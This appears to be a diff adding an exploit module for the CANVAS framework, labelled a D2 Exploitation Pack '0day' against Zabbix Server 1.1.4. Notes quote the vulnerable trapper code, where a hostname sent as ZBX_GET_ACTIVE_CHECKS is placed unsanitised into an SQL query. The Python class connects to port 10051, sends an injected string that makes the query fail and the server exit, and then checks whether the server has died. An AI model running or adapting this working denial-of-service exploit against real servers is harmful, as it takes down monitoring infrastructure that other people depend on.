@@ -1,0 +1,159 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from MOSDEF import mosdef as mosdef
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "Zabbix Server 1.1.4 Remote SQL Injection"
+VERSION = "0.1"
+DESCRIPTION = "[0day] Zabbix Server 1.1.4 Remote SQL Injection"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+NOTES = """
+function process_trap() in zabbix_server/trapper/trapper.c
+
+int process_trap(int sockfd,char *s, int max_len)
+{
+[...]
+  for( p=s+strlen(s)-1; p>s && ( *p=='\\r' ||
+    *p =='\\n' || *p == ' ' ); --p );
+[...]
+  if(strncmp(s,"ZBX_GET_ACTIVE_CHECKS",
+      strlen("ZBX_GET_ACTIVE_CHECKS")) == 0)
+    line=strtok(s,"\\n");
+    host=strtok(NULL,"\\n");
+[...]
+      if(autoregister(host) == SUCCEED)
+}
+
+s is the buffer which we send on port 10051 of the server Zabbix.
+Only the characters '\\r', '\\n', ' ' are filtered. If s is of form
+ZBX_GET_ACTIVE_CHECKS\\nhost, the function autoregister () is called.
+
+in zabbix_server/trapper/autoregister.c:
+
+int autoregister(char *server)
+{
+[...]
+  if(DBhost_exists(server) == SUCCEED)
+[...]
+}
+
+in libs/zbxdbhigh/host.c:
+
+int DBhost_exists(char *server)
+{
+[...]
+  snprintf(sql,sizeof(sql)-1,
+    "select hostid from hosts where host='%s'", server);
+  result = DBselect(sql);
+[...]
+}
+
+server is the buffer which we control. A vulnerability of the type
+SQL injection is possible. Other errors of this type are certainly
+present elsewhere in the code (zabbix_server/trapper/active.c -
+send_list_of_active_checks ()).
+
+If SQL request fail, the server is down:
+
+function DBselect() in libs/zbxdbhigh/db.c:
+
+DB_RESULT DBselect(char *query)
+{
+/* Do not include any code here. Will break HAVE_PGSQL section */
+#ifdef  HAVE_MYSQL
+  zabbix_log( LOG_LEVEL_DEBUG, "Executing query:%s",query);
+
+  if(mysql_query(&mysql,query) != 0)
+  {
+    zabbix_log( LOG_LEVEL_ERR, "Query::%s",query);
+    zabbix_log(LOG_LEVEL_ERR, "Query failed:%s [%d]",
+      mysql_error(&mysql), mysql_errno(&mysql) );
+
+    exit(FAIL);
+  }
+[...]
+
+The exploit sends an invalid request SQL to trigger the vulnerability.
+"""
+
+DOCUMENTATION = {}
+DOCUMENTATION["Notes"] = NOTES 
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setPort(10051)
+		self.setHost("")
+		self.setVersion(1)
+		self.setInfo(DESCRIPTION)
+		self.name=NAME
+		return
+    
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+
+		self.log("Connecting to %s:%d"%(self.host,self.port))
+		s = self.gettcpsock()
+		try:
+			s.connect((self.host, self.port))
+		except:
+			self.log("Could not connect to %s on port %d" % (self.host, self.port))
+			return 0
+
+		sql = "blaat"
+
+		buf = "ZBX_GET_ACTIVE_CHECKS\nUnix_t' %s '" % sql
+
+		try:
+			self.log("Triggering the vulnerability")
+			self.log("SQL request: '%s'" % sql)
+			s.sendall(buf)
+		except:
+			pass
+
+		self.log("Done sending attack buffer.")
+
+		self.log("Trying to connect again.")
+
+		try:
+			s.connect((self.host, self.port))
+			self.log("We connected - it did not die - it must be patched.")
+			ret = 0
+		except: 
+			self.log("Could not connect .. good .. Zabbix Server is died.")
+			ret = 1
+			
+		self.log("Done with exploit")
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+		return ret
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:10051]"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
